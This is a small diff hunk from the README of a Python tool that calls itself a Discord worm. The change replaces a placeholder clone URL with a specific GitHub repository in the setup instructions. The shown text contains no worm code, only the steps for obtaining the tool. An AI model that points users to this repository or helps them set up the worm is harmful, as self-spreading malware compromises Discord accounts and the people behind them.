@@ -18,7 +18,7 @@ This is a simple Discord worm script written in Python using the requests librar
 1. Clone the repository:
 
     ```bash
-    git clone https://github.com/yourusername/discord-worm.git
+    git clone https://github.com/Syntaxerrorontop/DiscordWorm
     cd discord-worm
     ```
 
